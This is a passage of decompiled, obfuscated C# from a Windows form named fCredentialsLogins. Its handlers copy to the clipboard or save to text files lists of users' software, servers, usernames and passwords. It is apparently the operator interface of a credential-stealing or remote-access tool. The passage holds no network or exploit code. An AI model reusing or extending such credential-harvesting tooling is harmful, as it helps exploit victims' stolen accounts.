			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F32 RID: 3890 RVA: 0x00007348 File Offset: 0x00005548
	private void fCredentialsLogins_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06000F33 RID: 3891 RVA: 0x00071784 File Offset: 0x0006F984
	private void method_13(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_10();
		try
		{
			foreach (object obj in fastObjectListView.SelectedObjects)
			{
				cCredentialsUser cCredentialsUser = (cCredentialsUser)obj;
				stringBuilder.Append(cCredentialsUser.sLogins.ToString());
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string s = stringBuilder.ToString();
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Text file |*.txt";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = saveFileDialog.FileName;
				byte[] bytes = Encoding.Unicode.GetBytes(s);
				bool flag = true;
				byte[] byte_ = bytes;
				string string_ = fileName;
				Class136.Class142 @class = new Class136.Class142();
				@class.string_0 = string_;
				@class.byte_0 = byte_;
				@class.bool_0 = false;
				try
				{
					if (flag)
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					else
					{
						Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x06000F34 RID: 3892 RVA: 0x00009123 File Offset: 0x00007323
	private void method_14(object sender, EventArgs e)
	{
		this.vmethod_68().Text = "Logins: " + Conversions.ToString(this.vmethod_52().Items.Count);
	}

	// Token: 0x06000F35 RID: 3893 RVA: 0x000718BC File Offset: 0x0006FABC
	private void method_15(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
					stringBuilder.AppendLine(string.Concat(new string[]
					{
						cCredentialsLogin.USER,
						"\t",
						cCredentialsLogin.TYPE,
						"\t",
						cCredentialsLogin.SOFTWARE,
						"\t",
						cCredentialsLogin.SERVER,
						"\t",
						cCredentialsLogin.USERNAME,
						"\t",
						cCredentialsLogin.PASSWORD
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F36 RID: 3894 RVA: 0x000719D4 File Offset: 0x0006FBD4
	private void method_16(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
				stringBuilder.AppendLine(string.Concat(new string[]
				{
					cCredentialsLogin.USER,
					"\t",
					cCredentialsLogin.TYPE,
					"\t",
					cCredentialsLogin.SOFTWARE,
					"\t",
					cCredentialsLogin.SERVER,
					"\t",
					cCredentialsLogin.USERNAME,
					"\t",
					cCredentialsLogin.PASSWORD
				}));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F37 RID: 3895 RVA: 0x00071AD8 File Offset: 0x0006FCD8
	private void method_17(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
					stringBuilder.AppendLine(cCredentialsLogin.USER);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F38 RID: 3896 RVA: 0x00071B84 File Offset: 0x0006FD84
	private void method_18(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
					stringBuilder.AppendLine(cCredentialsLogin.TYPE);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F39 RID: 3897 RVA: 0x00071C30 File Offset: 0x0006FE30
	private void method_19(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
					stringBuilder.AppendLine(cCredentialsLogin.SOFTWARE);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F3A RID: 3898 RVA: 0x00071CDC File Offset: 0x0006FEDC
	private void method_20(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
					stringBuilder.AppendLine(cCredentialsLogin.SERVER);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F3B RID: 3899 RVA: 0x00071D88 File Offset: 0x0006FF88
	private void method_21(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
					stringBuilder.AppendLine(cCredentialsLogin.USERNAME);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F3C RID: 3900 RVA: 0x00071E34 File Offset: 0x00070034
	private void method_22(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_52();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cCredentialsLogin cCredentialsLogin = (cCredentialsLogin)obj;
					stringBuilder.AppendLine(cCredentialsLogin.PASSWORD);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06000F3D RID: 3901 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_23(object sender, EventArgs e)
	{
	}

	// Token: 0x06000F3E RID: 3902 RVA: 0x0000914F File Offset: 0x0000734F
	private void method_24(object sender, MouseEventArgs e)
	{
		this.vmethod_74().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_52().SelectedObjects.Count > 0, true, false));
	}

	// Token: 0x06000F3F RID: 3903 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_25(object sender, EventArgs e)
	{
	}

	// Token: 0x06000F40 RID: 3904 RVA: 0x0000911B File Offset: 0x0000731B
	private void method_26(object sender, EventArgs e)
	{
		this.method_1();
	}

	// Token: 0x06000F41 RID: 3905 RVA: 0x00009185 File Offset: 0x00007385
	private void method_27(object sender, EventArgs e)
	{
		Class130.concurrentDictionary_8.Clear();
		this.vmethod_52().ClearObjects();
		this.vmethod_10().ClearObjects();
	}

	// Token: 0x06000F42 RID: 3906 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_28(object sender, EventArgs e)
	{
	}

	// Token: 0x06000F43 RID: 3907 RVA: 0x00071EE0 File Offset: 0x000700E0
	private void method_29(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_10();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cCredentialsUser cCredentialsUser = (cCredentialsUser)obj;
				stringBuilder.Append(cCredentialsUser.sLogins.ToString());
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string s = stringBuilder.ToString();
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Text file |*.txt";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = saveFileDialog.FileName;
				byte[] bytes = Encoding.Unicode.GetBytes(s);
				bool flag = true;
				byte[] byte_ = bytes;
				string string_ = fileName;
				Class136.Class142 @class = new Class136.Class142();
				@class.string_0 = string_;
				@class.byte_0 = byte_;
				@class.bool_0 = false;
				try
				{
					if (flag)
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					else
					{
						Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x06000F44 RID: 3908 RVA: 0x00072018 File Offset: 0x00070218
	private void method_30(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			if (this.vmethod_52().Items.Count != 0)
			{
				FastObjectListView fastObjectListView = this.vmethod_52();
				int num = fastObjectListView.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (fastObjectListView.Items[i].Selected)
					{
						stringBuilder.Append(fastObjectListView.Items[i].Text);
						int num2 = fastObjectListView.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							stringBuilder.Append("\t" + fastObjectListView.Items[i].SubItems[j].Text);
						}
						stringBuilder.Append("\r\n");
					}
				}
				if (stringBuilder.Length > 0)
				{
					string text = stringBuilder.ToString();
					SaveFileDialog saveFileDialog = new SaveFileDialog();
					saveFileDialog.Filter = "Text file |*.txt";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						string fileName = saveFileDialog.FileName;
						byte[] bytes = Encoding.Unicode.GetBytes(text.Remove(text.LastIndexOf("\r\n")));
						bool flag = true;
						byte[] byte_ = bytes;
						string string_ = fileName;
						Class136.Class142 @class = new Class136.Class142();
						@class.string_0 = string_;
						@class.byte_0 = byte_;
						@class.bool_0 = false;
						try
						{
							if (flag)
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
							else
							{
								Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
		}
	}

	// Token: 0x06000F45 RID: 3909 RVA: 0x000721C4 File Offset: 0x000703C4
	private void method_31(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			if (this.vmethod_52().Items.Count != 0)
			{
				FastObjectListView fastObjectListView = this.vmethod_52();
				int num = fastObjectListView.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(fastObjectListView.Items[i].Text);
					int num2 = fastObjectListView.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						stringBuilder.Append("\t" + fastObjectListView.Items[i].SubItems[j].Text);
					}
					stringBuilder.Append("\r\n");
				}
				if (stringBuilder.Length > 0)
				{
					string text = stringBuilder.ToString();
					SaveFileDialog saveFileDialog = new SaveFileDialog();
					saveFileDialog.Filter = "Text file |*.txt";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						string fileName = saveFileDialog.FileName;
						byte[] bytes = Encoding.Unicode.GetBytes(text.Remove(text.LastIndexOf("\r\n")));
						bool flag = true;
						byte[] byte_ = bytes;
						string string_ = fileName;
						Class136.Class142 @class = new Class136.Class142();
						@class.string_0 = string_;
						@class.byte_0 = byte_;
						@class.bool_0 = false;
						try
						{
							if (flag)
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
							else
							{
								Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
		}
	}

	// Token: 0x040005C3 RID: 1475
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040005C4 RID: 1476
	private OLVColumn olvcolumn_0;

	// Token: 0x040005C5 RID: 1477
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x040005C6 RID: 1478
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x040005C7 RID: 1479
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x040005C8 RID: 1480
	private FastObjectListView fastObjectListView_0;

	// Token: 0x040005C9 RID: 1481
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x040005CA RID: 1482
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x040005CB RID: 1483
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x040005CC RID: 1484
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x040005CD RID: 1485
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x040005CE RID: 1486
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x040005CF RID: 1487
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x040005D0 RID: 1488
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x040005D1 RID: 1489
	private ToolStripMenuItem toolStripMenuItem_7;

	// Token: 0x040005D2 RID: 1490
	private OLVColumn olvcolumn_1;

	// Token: 0x040005D3 RID: 1491
	private ToolStripMenuItem toolStripMenuItem_8;

	// Token: 0x040005D4 RID: 1492
	private ToolStripMenuItem toolStripMenuItem_9;

	// Token: 0x040005D5 RID: 1493
	private ToolStripSeparator toolStripSeparator_3;

	// Token: 0x040005D6 RID: 1494
	private ToolStripMenuItem toolStripMenuItem_10;

	// Token: 0x040005D7 RID: 1495
	private ToolStripSeparator toolStripSeparator_4;

	// Token: 0x040005D8 RID: 1496
	private ToolStripMenuItem toolStripMenuItem_11;

	// Token: 0x040005D9 RID: 1497
	private ToolStripSeparator toolStripSeparator_5;

	// Token: 0x040005DA RID: 1498
	private ToolStripMenuItem toolStripMenuItem_12;

	// Token: 0x040005DB RID: 1499
	private ToolStripSeparator toolStripSeparator_6;

	// Token: 0x040005DC RID: 1500
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_0;

	// Token: 0x040005DD RID: 1501
	private FastObjectListView fastObjectListView_1;

	// Token: 0x040005DE RID: 1502
	private OLVColumn olvcolumn_2;

	// Token: 0x040005DF RID: 1503
	private OLVColumn olvcolumn_3;

	// Token: 0x040005E0 RID: 1504
	private OLVColumn olvcolumn_4;

	// Token: 0x040005E1 RID: 1505
	private OLVColumn olvcolumn_5;

	// Token: 0x040005E2 RID: 1506
	private OLVColumn olvcolumn_6;

	// Token: 0x040005E3 RID: 1507
	private OLVColumn olvcolumn_7;

	// Token: 0x040005E4 RID: 1508
	private StatusStrip statusStrip_0;

	// Token: 0x040005E5 RID: 1509
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x040005E6 RID: 1510
	private ToolStripProgressBar toolStripProgressBar_0;

	// Token: 0x040005E7 RID: 1511
	private ContextMenuStrip contextMenuStrip_1;

	// Token: 0x040005E8 RID: 1512
	private ToolStripMenuItem toolStripMenuItem_13;

	// Token: 0x040005E9 RID: 1513
	private ToolStripMenuItem toolStripMenuItem_14;

	// Token: 0x040005EA RID: 1514
	private ToolStripSeparator toolStripSeparator_7;

	// Token: 0x040005EB RID: 1515
	private ToolStripMenuItem toolStripMenuItem_15;

	// Token: 0x040005EC RID: 1516
	private System.Windows.Forms.Timer timer_1;

	// Token: 0x040005ED RID: 1517
	private ToolStripMenuItem toolStripMenuItem_16;

	// Token: 0x040005EE RID: 1518
	private ToolStripMenuItem toolStripMenuItem_17;

	// Token: 0x040005EF RID: 1519
	private ToolStripMenuItem toolStripMenuItem_18;

	// Token: 0x040005F0 RID: 1520
	private ToolStripMenuItem toolStripMenuItem_19;

	// Token: 0x040005F1 RID: 1521
	private ToolStripMenuItem toolStripMenuItem_20;

	// Token: 0x040005F2 RID: 1522
	private ToolStripMenuItem toolStripMenuItem_21;

	// Token: 0x040005F3 RID: 1523
	private ToolStripMenuItem toolStripMenuItem_22;

	// Token: 0x040005F4 RID: 1524
	private ToolStripSeparator toolStripSeparator_8;

	// Token: 0x040005F5 RID: 1525
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x040005F6 RID: 1526
	private ToolStripStatusLabel toolStripStatusLabel_2;

	// Token: 0x040005F7 RID: 1527
	private StatusStrip statusStrip_1;

	// Token: 0x040005F8 RID: 1528
	private ToolStripStatusLabel toolStripStatusLabel_3;

	// Token: 0x040005F9 RID: 1529
	private ToolStripStatusLabel toolStripStatusLabel_4;

	// Token: 0x040005FA RID: 1530
	private ToolStripMenuItem toolStripMenuItem_23;

	// Token: 0x040005FB RID: 1531
	private ToolStripSeparator toolStripSeparator_9;

	// Token: 0x040005FC RID: 1532
	private ToolStripSeparator toolStripSeparator_10;

	// Token: 0x040005FD RID: 1533
	private ToolStripMenuItem toolStripMenuItem_24;

	// Token: 0x040005FE RID: 1534
	private ToolStripMenuItem toolStripMenuItem_25;

	// Token: 0x040005FF RID: 1535
	private ToolStripSeparator toolStripSeparator_11;

	// Token: 0x04000600 RID: 1536
	private ToolStripMenuItem toolStripMenuItem_26;

	// Token: 0x02000116 RID: 278
	// (Invoke) Token: 0x06000F49 RID: 3913
	private delegate void Delegate75(string string_0, string string_1, string string_2);

	// Token: 0x02000117 RID: 279
	// (Invoke) Token: 0x06000F4D RID: 3917
	private delegate void Delegate76();

	// Token: 0x02000118 RID: 280
	// (Invoke) Token: 0x06000F51 RID: 3921
	private delegate void Delegate77();
}
